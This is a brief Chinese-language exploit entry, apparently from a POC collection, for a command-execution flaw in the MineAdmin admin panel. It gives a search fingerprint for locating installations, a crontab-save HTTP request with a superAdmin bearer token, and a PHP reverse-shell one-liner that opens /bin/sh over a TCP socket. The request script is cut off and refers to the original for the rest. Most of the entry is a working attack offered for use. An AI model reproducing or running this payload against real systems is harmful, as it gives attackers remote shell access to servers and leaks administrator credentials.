# MineAdmin企业级后台管理系统refresh存在命令执行漏洞

- **系统**：MineAdmin　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="MineAdmin"`
- **请求**：`POST /system/refresh HTTP/1.1`
- **关键头**：`Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZWZh…`　`Content-Type: application/json;charset=UTF-8`

**请求体 / payload**
```
POC/EXP：添加恶意命令（此处用dnslog回显命令）
反弹shell语句是：eval('$s=stream_socket_client("tcp://127.0.0.1:7788");proc_open("/bin/sh -i", array(0=>$s,1=>$s,2=>$s),$p);');
POST /setting/crontab/save HTTP/1.1
Host:
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZWZhdWx0XzY5NWNiNWY3ZWVhODAyLjkxMTg5NDMwIiwiaWF0IjoxNzY3NjgzNTc1Ljk3NzU0MywibmJmIjoxNzY3NjgzNTc1Ljk3NzU0MywiZXhwIjoxNzY3NjkwNzc1Ljk3NzU0MywiaWQiOjEsInVzZXJuYW1lIjoic3VwZXJBZG1pbiIsInVzZXJfdHlwZSI6IjEwMCIsIm5pY2tuYW1lIjoi5Yib5aeL5Lq6IiwiY3JlYXRlZF9hdCI6IjIwMjUtMDctMDIgMTM6Mzg6NDEiLCJ1cGRhdGVkX2F0IjoiMjAyNi0wMS0wNiAxNzoxNDowMCIsInJlbWF…（脚本共 1581 字，完整版见原文）
```
- **预期**：200　|　—